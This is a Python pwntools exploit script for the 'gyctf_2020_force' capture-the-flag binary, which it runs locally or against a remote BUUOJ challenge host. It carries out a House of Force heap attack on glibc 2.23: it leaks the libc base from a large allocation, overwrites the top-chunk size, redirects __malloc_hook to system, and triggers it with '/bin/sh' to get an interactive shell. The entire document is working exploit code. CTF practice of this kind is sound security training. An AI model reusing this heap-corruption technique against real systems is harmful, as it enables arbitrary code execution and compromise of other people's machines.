import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./gyctf_2020_force')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./gyctf_2020_force')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld=ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',26209)
			elf=ELF('./gyctf_2020_force')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld=ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a,c):
			io.sendlineafter('2:puts\n','1')
			io.sendlineafter('size\n',str(a))
			io.recvuntil('0x')
			data=int(io.recvuntil('\n',drop=True),16)
			io.sendafter('content\n',c)
			return data

		def show(a):
			io.sendlineafter('2:puts','2')

		libc_base=add(0x8000000,'a'*0x20+p64(0)+p64(0xffffffffffffffff))+0x8001000-0x10
		libc.address=libc_base
		heap_addr=add(0x10,'a'*0x10+p64(0)+p64(0xffffffffffffffff))-0x10
		size_0=libc.sym['__malloc_hook']-0x10-heap_addr-0x20-0x10
		add(size_0,'aaa')



		add(0x10,p64(libc.sym['system']))
		io.sendlineafter('2:puts','1')
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		io.sendafter('size',str(bin_sh_addr))
		



		success('heap_addr:'+hex(heap_addr))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue